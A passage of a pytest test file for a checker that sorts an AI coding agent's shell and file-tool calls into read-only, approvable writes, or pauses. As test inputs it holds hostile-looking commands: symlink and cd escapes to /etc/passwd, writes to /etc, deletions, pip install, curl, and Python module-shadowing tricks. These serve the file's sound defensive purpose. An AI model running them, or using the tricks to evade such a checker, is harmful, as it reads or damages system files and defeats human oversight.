    assert not reads(command, run)


def test_with_no_folder_known_a_command_that_reads_a_file_stays_a_pause() -> None:
    """Nothing can be placed: only a command that reads no file is read-only."""
    assert read_only("Bash", {"command": "echo hi; date +%s; pwd; which python3 | tr a b"})
    for command in ("cat s.csv", "ls", "cd /srv && ls", "grep -c x '*.csv'", py("print(1)")):
        assert not read_only("Bash", {"command": command})
    assert not shell.python_reads("print(open('s.csv').read())")
    assert shell.python_reads("print(open('s.csv').read())", at=Path("/srv/run"))
    assert shell.python_reads(
        "print(open('/kept/a').read())", at=Path("/srv/run"), reads=[Path("/kept")]
    )


def test_a_word_the_shell_fills_in_is_read_as_the_files_it_names(run: Path) -> None:
    """``*.csv`` is the files it matches: each one the run may read, none named like an
    option (``-delete``), none a link out of the folder."""
    (run / "a.csv").write_text("x")
    assert reads("wc -l *.csv ./*.csv && find . -name '*.csv' && ls *.xlsx", run)
    (run / "link").symlink_to("/etc")
    assert not reads("cat l*/passwd", run)
    assert not reads("cat link/passwd", run)
    assert reads("cat a*", run)
    (run / "-delete").write_text("")
    assert not reads("find *", run)
    assert not reads("cat s.csv --x=*", run)
    assert reads("cat a*", run)  # nothing it matches starts with a dash


def test_a_program_is_one_of_the_systems(run: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A name is the program the system's folders hold; one found in the run's folder, in
    any other, or not at all, is not."""
    assert reads("cat s.csv && /usr/bin/wc -l s.csv && /bin/ls", run)
    for found in (f"{run}/bin/cat", "/tmp/x/cat", None):
        monkeypatch.setattr(shell.shutil, "which", lambda name, path=None, found=found: found)
        assert not reads("cat s.csv", run)
    monkeypatch.setattr(shell, "SYSTEM", frozenset({str(run)}))  # the folder itself, a system's
    monkeypatch.setattr(shell.shutil, "which", lambda name, path=None: f"{run}/{name}")
    assert not reads("cat s.csv", run)


def test_python_is_the_installed_one(run: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The folder Python starts in is first on its path: a module there named as one of its
    own is imported in its place - and with a library imported, any module there may be."""
    plain, library = py("import json\nprint(json.dumps(1))"), py("import numpy\nprint(numpy.pi)")
    assert reads(plain, run) and reads(library, run) and reads(py("print(1)"), run)
    (run / "analysis.py").write_text("")  # no module of Python's has that name
    assert reads(plain, run) and not reads(library, run)
    (run / "analysis.py").unlink()
    for name in ("json.py", "re.pyc", "stringprep.py", "sitecustomize.py", "x.pth", "matplotlibrc"):
        (run / name).write_text("")
        assert not reads(plain, run) and not reads(py("print(1)"), run), name
        (run / name).unlink()
    (run / "enum").mkdir()
    assert reads(plain, run)  # a folder that is no package
    (run / "enum" / "__init__.py").write_text("")
    assert not reads(plain, run)
    (run / "enum" / "__init__.py").unlink()
    for variable, value, safe in (
        ("PYTHONPATH", "src:.", False),
        ("PYTHONPATH", f"/opt/lib:{run}/lib", False),
        ("PYTHONPATH", "/opt/lib", True),
        ("PYTHONSTARTUP", f"{run}/start.py", False),
    ):
        monkeypatch.setenv(variable, value)
        assert reads(plain, run) is safe, (variable, value)
        monkeypatch.delenv(variable)


#: A read through the run's folder that a ``cd`` the line holds may leave elsewhere: the folder
#: does not exist (``cd`` fails, and ``;`` goes on from where it was), a ``*`` that the shell
#: fills in with a link out of the folder, or a ``cd`` in a pipe's own shell.
ELSEWHERE_AFTER_CD = [
    "cd nosuch ; cat ../secret",
    "cd nosuch || cat ../secret",
    "cd sub | cat ../secret",
    "cd l* && cat passwd",
    "cd sub ; cat ../../secret",
]


@pytest.mark.parametrize("command", ELSEWHERE_AFTER_CD)
def test_a_cd_is_followed_to_every_folder_it_may_leave_the_line_in(command: str, run: Path) -> None:
    (run / "sub").mkdir()
    (run / "link").symlink_to("/etc")
    assert not reads(command, run)


def test_a_cd_that_surely_moves_the_line_is_followed(run: Path) -> None:
    (run / "sub").mkdir()
    assert reads("cd sub && cat ../a.csv && ls", run)
    assert reads("cd sub ; cat a.csv", run)  # from the run's folder or from sub: both inside


def test_the_environment_the_command_gets_is_the_one_read(
    run: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The adapter passes the environment its CLI is given: the ``PATH`` a program is found on,
    what puts a folder on Python's path, the ``CDPATH`` a ``cd`` searches - not this
    process's."""
    plain = py("import json\nprint(json.dumps(1))")
    command = {"command": plain}
    assert read_only("Bash", command, run, env={})
    for variable, value in (
        ("PYTHONPATH", "src"),
        ("PYTHONSTARTUP", f"{run}/s.py"),
        ("PYTHONHOME", "py"),  # a relative one: the run's
    ):
        assert not read_only("Bash", command, run, env={variable: value}), variable
    monkeypatch.setenv("PYTHONPATH", "src")  # this process's: not the CLI's
    assert read_only("Bash", command, run, env={})
    monkeypatch.undo()
    monkeypatch.setattr(shell.shutil, "which", lambda name, path=None: f"{path}/{name}")
    assert read_only("Bash", {"command": "cat a.csv"}, run, env={"PATH": "/usr/bin"})
    assert not read_only("Bash", {"command": "cat a.csv"}, run, env={"PATH": f"{run}/bin"})
    (run / "sub").mkdir()
    cd = {"command": "cd sub && cat passwd"}
    assert read_only("Bash", cd, run, env={"PATH": "/usr/bin"})
    assert not read_only("Bash", cd, run, env={"PATH": "/usr/bin", "CDPATH": "/etc"})
    plain_cd = {"command": "cd ./sub && cat a"}
    assert read_only("Bash", plain_cd, run, env={"PATH": "/usr/bin", "CDPATH": "/etc"})


def test_a_program_found_on_a_relative_path_is_found_from_the_shells_folder(
    run: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A ``PATH`` entry with no ``/`` at its start (``bin``, an empty one: ``.``) is a folder
    of wherever the shell is: a ``cat`` there is not the system's."""
    monkeypatch.setattr(shell.shutil, "which", WHICH)
    system = os.pathsep.join(sorted(shell.SYSTEM))
    command = {"command": "cat a.csv"}
    assert read_only("Bash", command, run, env={"PATH": f"bin{os.pathsep}{system}"})
    (run / "bin").mkdir()
    (run / "bin" / "cat").write_text("")
    (run / "bin" / "cat").chmod(0o755)
    for path in (f"bin{os.pathsep}{system}", f"{run}/bin{os.pathsep}{system}"):
        assert not read_only("Bash", command, run, env={"PATH": path}), path
    assert not shell.Shell(None).read_only("Bash", command)
    assert not shell._found("cat", shell._Folders(None, None, (), {"PATH": "bin"}))


def test_a_command_given_a_folder_of_its_own_runs_there(run: Path) -> None:
    """Kimi Code's ``Bash`` takes the folder a command runs in (``cwd``): as after a ``cd``,
    one the run may read, and what the command reads is placed from there."""
    (run / "sub").mkdir()
    (run / "link").symlink_to("/etc")
    kept = run.parent / "kept"
    assert read_only("Bash", {"command": "cat a.csv", "cwd": "sub"}, run, [kept])
    assert read_only("Bash", {"command": "cat a.csv", "cwd": str(kept)}, run, [kept])
    for cwd in ("/etc", "link", "..", "~", 3, "nosuch"):
        assert not read_only("Bash", {"command": "cat passwd", "cwd": cwd}, run, [kept]), cwd
    assert not read_only("Bash", {"command": "cat ../secret", "cwd": "sub/.."}, run, [kept])


def test_a_shell_that_keeps_its_folder_is_read_from_every_folder_it_may_be_in(
    tmp_path: Path,
) -> None:
    """Claude Code's shell keeps the folder a ``cd`` left it in. Once a person approved a
    ``cd`` out of the folder, a later relative read is placed from there too, not from the
    run's folder alone; a folder of the run's (``reads``) it went to, likewise."""
    run, kept = tmp_path / "a" / "run", tmp_path / "b" / "kept"
    run.mkdir(parents=True)
    kept.mkdir(parents=True)
    (run / "sub").mkdir()
    (run / "link").symlink_to("/etc")
    bash = shell.Shell(run, [kept], env={})
    assert bash.read_only("Bash", {"command": "cat a.csv"})
    bash.ran({"command": "ls -la"})  # no cd: where it was
    assert bash.places == {run}
    bash.ran({"command": "cd /etc && cat passwd"})  # a person approved it
    assert bash.places == {run, Path("/etc").resolve()}
    for command in ("cat passwd", "cat a.csv", py("print(open('a.csv').read())")):
        assert not bash.read_only("Bash", {"command": command}), command
    assert bash.read_only("Bash", {"command": f"cat {run}/a.csv && echo hi"})
    for command in ("ls", "grep -r root", "du"):  # the folder it is in: /etc too
        assert not bash.read_only("Bash", {"command": command}), command

    bash = shell.Shell(run, [kept], env={})
    bash.ran({"command": "cd link"})  # inside, by its name: /etc
    assert not bash.read_only("Bash", {"command": "cat passwd"})
    bash = shell.Shell(run, [kept], env={})
    bash.ran({"command": f"cd {kept}"})  # a folder the run may read, beside another
    assert not bash.read_only("Bash", {"command": "cat ../run/x"})  # b/run/x, not a/run/x
    assert bash.read_only("Bash", {"command": "cat x"})  # in run or kept: both readable
    bash = shell.Shell(run, [kept], env={})
    bash.ran({"command": "cd sub && cd nosuch && ls"})  # stops at the one that fails
    assert bash.places == {run, run / "sub"}
    assert bash.read_only("Bash", {"command": "cat a.csv"})
    for n in range(2):
        (run / f"more{n}").mkdir()
        bash.ran({"command": f"cd {run / f'more{n}'}"})
    assert bash.places is not None and len(bash.places) == 4  # four folders followed
    (run / "more2").mkdir()
    bash.ran({"command": f"cd {run / 'more2'}"})
    assert bash.places is None  # a fifth: where it is is no longer known


@pytest.mark.parametrize(
    "command",
    [
        "cd $HOME",
        "cd",
        "cd -",
        "cd ~",
        "cd s*",
        "pushd /etc",
        "ls && cd /etc",
        "cd sub ; cd /etc",
        "eval 'cd /etc'",
        "source env.sh",
        ". env.sh",
        "builtin cd /etc",
        "X=1 cd /etc",
        "if true; then cd /etc; fi",
        "ls\ncd /etc",
        "echo $(cd /etc)",
    ],
)
def test_a_move_that_cannot_be_followed_leaves_nothing_placed(command: str, run: Path) -> None:
    bash = shell.Shell(run, env={})
    assert shell.moves({"command": command})
    bash.ran({"command": command})
    assert bash.places is None
    assert not bash.read_only("Bash", {"command": "cat a.csv"})
    assert bash.read_only("Bash", {"command": "echo hi"})
    bash.ran({"command": "cd /tmp"})  # not known stays not known
    assert bash.places is None


def test_a_move_under_way_or_in_the_background_leaves_nothing_placed(run: Path) -> None:
    bash = shell.Shell(run, env={})
    assert not bash.read_only("Bash", {"command": "cat a.csv"}, moving=True)
    bash.ran({"command": "cd sub", "run_in_background": True})
    assert bash.places is None
    bash = shell.Shell(run, env={"CDPATH": "/etc"})
    bash.ran({"command": "cd sub"})  # CDPATH may lead it elsewhere
    assert bash.places is None
    bash = shell.Shell(run, env={})
    for n in range(shell.PLACES_MAX):
        (run / f"d{n}").mkdir()
        bash.ran({"command": f"cd d{n}"})
    assert bash.places is None  # past PLACES_MAX folders


def test_a_command_that_cannot_move_its_shell_is_known_so() -> None:
    for command in (
        "ls .",
        "echo cd",
        "cat cd",
        "python3 - <<'EOF'\nimport os\nEOF",
        "grep -c x .",
    ):
        assert not shell.moves({"command": command}), command
    assert not shell.moves({})
    assert shell.Shell(None).places is None


def test_each_move_and_each_word_a_compound_command_starts_with_is_known() -> None:
    moving = ("cd /tmp", "pushd /tmp", "popd", "builtin cd /tmp", "command cd /tmp", "eval x")
    for command in (*moving, "source x", ". x", "exec bash"):
        assert shell.moves({"command": command}), command
    for word in ("if", "then", "else", "elif", "do", "while", "until", "!", "time"):
        assert shell.moves({"command": f"{word} cd /tmp"}), word


def test_only_a_shell_call_is_read_here() -> None:
    assert not read_only("Write", {"command": "cat s.csv", "file_path": "x"})
    assert not read_only("Bash", {})


# --------------------------------------------------------------------------- writes in the run's folder
#: What Kimi and Claude ran to save the file a user asked for (the Haiku re-measure), each
#: writing only inside the run's own working folder (``{w}``): approved, as a user would.
SAVES = [
    "mkdir -p exports && python3 -c \"import pandas as pd; pd.DataFrame().to_excel('exports/q3.xlsx')\"",
    "cd {w} && python3 - <<'EOF'\nfrom openpyxl import Workbook\nwb = Workbook()\nwb.save('denim_q3.xlsx')\nEOF",
    "cp exports/s.csv {w}/S14_sales_2026.csv && wc -l {w}/S14_sales_2026.csv",
    "cp -r data/*.csv {w}/exports",
    "python3 -c \"import matplotlib.pyplot as plt; plt.plot([1, 2]); plt.savefig('chart.png')\"",
    "python3 -c \"from pathlib import Path; Path('notes.md').write_text('# Q3')\"",
    "python3 -c \"import json; json.dump({{'a': 1}}, open('out/a.json', 'w'))\"",
    "echo done > status.txt",
    "python3 -c \"import os; os.makedirs('out', exist_ok=True); os.mkdir('out/a')\"",
    "python3 -c \"from pathlib import Path; Path('exports').mkdir(parents=True); Path('a.txt').touch()\"",
    "python3 -c \"import pathlib; pathlib.Path('notes.md').open('w').write('# Q3')\"",
    "python3 - <<'EOF'\nwith open('a.txt', 'w', encoding='utf-8') as f:\n    f.write('x')\nEOF",
    "python3 -c \"import sys; m = 'a'; open('log.txt', m).writelines(['x']); sys.stdout.write('ok')\"",
    "python3 -c \"import numpy as np; np.save('a.npy', np.arange(3))\"",
    "python3 - <<'EOF'\nimport matplotlib\nmatplotlib.use('Agg')\nimport matplotlib.pyplot as plt\n"
    "import pandas as pd\nax = pd.read_csv('s.csv').plot(kind='bar')\nax.set_title('Q3')\n"
    "ax.figure.savefig('c.png')\nplt.close()\nEOF",
    "touch a.txt",
    "python3 -c \"from pathlib import Path; Path('a.bin').write_bytes(b'x')\"",
    "python3 -c \"open('a.txt', 'w', errors='strict', newline='', buffering=1).write('x')\"",
    "python3 -c \"import pandas as pd; d = pd.DataFrame(); d.to_csv('a.csv'); d.to_parquet('a.pq')\"",
    "python3 -c \"import pandas as pd; d = pd.DataFrame(); d.to_json('a.json'); d.to_pickle('a.pkl')\"",
    "python3 -c \"import pandas as pd; pd.DataFrame().to_feather('a.feather')\"",
]
#: Writing outside it, deleting, moving, a path not written out, installing, the network: a pause.
OUTSIDE = [
    "cp a.csv /tmp/a.csv",
    "echo hi > ../outside.txt",
    "mkdir -p /etc/trellis",
    "cd /tmp && touch x",
    "cd .. && touch x",
    "rm q3.xlsx",
    "mv a.csv b.csv",
    "cp -f a.csv b.csv",
    "cp /etc/passwd a.txt",  # what it copies in is a read
    "cp /large_tool_results/3dfef05 S14_sales_2026.csv",
    "cp -* out",
    "touch link/x",  # a link inside the folder to a folder outside it
    "python3 -c \"p = 'c.png'; import matplotlib.pyplot as plt; plt.savefig(p)\"",
    "python3 -c \"import os; os.remove('q3.xlsx')\"",
    "python3 -c \"open('/etc/passwd', 'w').write('x')\"",
    "python3 -c \"import shutil; shutil.copy('a', 'b')\"",
    # the path a Path is made with, not what is written to it
    "python3 -c \"from pathlib import Path; Path('/etc/motd').write_text('notes.md')\"",
    "pip install openpyxl",
    "curl -o page.html https://example.com",
    # the Path that is written: not a variable's, a second part's, another function's of that name
    # (the first two were approved on main: the content was read as the path)
    "python3 -c \"from pathlib import Path; p = Path('/etc/motd'); p.write_text('notes.md')\"",
    "python3 -c \"from pathlib import Path as P; q = P; q('/etc/motd').write_text('notes.md')\"",
    "python3 -c \"from pathlib import Path; Path('ok', '/etc/motd').write_text('x')\"",
    "python3 -c \"from pathlib import Path; Path('ok', x=1).write_text('x')\"",
    "python3 -c \"from pathlib import Path; (Path('a') / '../../etc/motd').write_text('x')\"",
    "python3 -c \"from pathlib import Path; Path.write_text(Path('/etc/motd'), 'notes.md')\"",
    "python3 - <<'EOF'\nfrom pathlib import Path as P\ndef Path(x):\n    return P('/etc/motd')\n"
    "Path('notes.md').write_text('x')\nEOF",
    "python3 -c \"from pathlib import Path; p = Path('/etc/motd'); p.open('w')\"",
    "python3 -c \"open('a.txt', 'w', -1, None, None, None, True, print)\"",
    "python3 -c \"open('a.txt', 'w', opener=print)\"",
    "python3 -c \"import json; json.dump({}, open('/etc/x.json', 'w'))\"",
    "python3 -c \"import numpy as np; np.arange(3).dump('/etc/x.pkl')\"",
    "python3 -c \"import pandas as pd; pd.DataFrame().to_csv(*['/etc/x.csv'])\"",
    'python3 -c "import pandas as pd; pd.DataFrame().to_csv()"',
    "python3 -c \"import os; os.chdir('/etc'); open('x', 'w')\"",
    "python3 -c \"import matplotlib.pyplot as plt; plt.savefig('c.png', backend='module://x')\"",
    "python3 -c \"import matplotlib.pyplot as plt; plt.title('t', usetex=True); plt.savefig('c.png')\"",
    # a property given as a dict: by position or as the font's (approved on #218's head)
    "python3 -c \"import matplotlib.pyplot as plt; plt.title('t', {'usetex': 1}); plt.savefig('c.png')\"",
    "python3 -c \"import matplotlib.pyplot as plt; fd = {'usetex': 1}; plt.xlabel('x', fontdict=fd)\"",
    "python3 -c \"import matplotlib.pyplot as plt; s = plt.savefig; s('/etc/c.png')\"",
    "python3 -c \"from pathlib import Path; Path('/etc/motd').write_bytes(b'notes.md')\"",
]


@pytest.mark.parametrize("command", SAVES)
def test_a_save_inside_the_runs_folder_is_approved(command: str, tmp_path) -> None:
    command = command.format(w=tmp_path)
    assert approvable("Bash", {"command": command}, tmp_path)
    assert not read_only("Bash", {"command": command}, tmp_path)  # only to read there: a pause


@pytest.mark.parametrize("command", OUTSIDE)
def test_a_write_outside_the_folder_a_delete_or_a_move_stays_a_pause(
    command: str, tmp_path
) -> None:
    (tmp_path / "link").symlink_to("/tmp")
    assert not approvable("Bash", {"command": command}, tmp_path)


def test_a_frameworks_own_file_tool_is_approved_inside_the_folder_only(tmp_path) -> None:
    assert approvable("Write", {"file_path": str(tmp_path / "report.md")}, tmp_path)
    assert approvable("Write", {"path": "exports/report.md"}, tmp_path)  # Kimi's, relative
    for editor in ("Edit", "MultiEdit"):  # Claude Code's other tools that write one file
        assert approvable(editor, {"file_path": str(tmp_path / "report.md")}, tmp_path)
        assert not approvable(editor, {"file_path": "/tmp/report.md"}, tmp_path)
    assert not approvable("Write", {"file_path": "/tmp/report.md"}, tmp_path)
    assert not approvable("Write", {"file_path": str(tmp_path / "report.md")})


# --------------------------------------------------------------------------- what the lists promise
#: The names main refused wherever they were called (its ``PY_WRITES``).
REFUSED = {
    *("write", "writelines", "write_text", "write_bytes", "to_csv", "to_excel", "to_parquet"),
    *(
        "to_json",
        "to_pickle",
        "to_sql",
        "to_feather",
        "savefig",
        "save",
        "dump",
        "remove",
        "unlink",
    ),
    *("rmdir", "removedirs", "rmtree", "mkdir", "makedirs", "touch", "rename", "replace", "move"),
    *("copy", "copyfile", "copytree", "chmod", "chown", "truncate", "symlink", "link", "system"),
    *("popen", "run", "call", "check_call", "check_output", "Popen", "kill", "exec", "eval"),
    *("compile", "__import__"),
}


def _listed() -> list[tuple[str, str, object]]:
    """Each listed name of each listed module that is installed here, and what it names."""
    found = []
    for module, names in shell.PY_MODULES.items():
        if importlib.util.find_spec(module.split(".")[0]) is not None:
            found += [(module, n, getattr(importlib.import_module(module), n, None)) for n in names]
    return found


def test_no_name_main_refused_is_read_only_now() -> None:
    """Nothing is looser than it was: a name main refused is still refused, or is one checked
    where it is called (a save inside the folder, a write to a handle, a text's replace)."""
    listed = {name for names in shell.PY_MODULES.values() for name in names}
    assert not REFUSED & shell.PY_METHODS
    assert REFUSED & listed <= shell.PY_SAVES | shell.PY_HANDLES
    assert not REFUSED & shell.PY_BUILTINS


def test_a_listed_name_is_there_and_is_no_module() -> None:
    """A module is reached only as a listed module: no listed name of one is itself a module
    (``glob.os``), and each is there (no name listed by mistake)."""
    for module, name, value in _listed():
        assert value is not None, f"{module}.{name}"
        assert not inspect.ismodule(value), f"{module}.{name}"


def test_no_listed_method_of_a_listed_value_is_a_module() -> None:
    """Nor does a listed class or function give a module back by a listed attribute."""
    for module, name, value in _listed():
        for method in shell.PY_METHODS:
            assert not inspect.ismodule(getattr(value, method, None)), f"{module}.{name}.{method}"
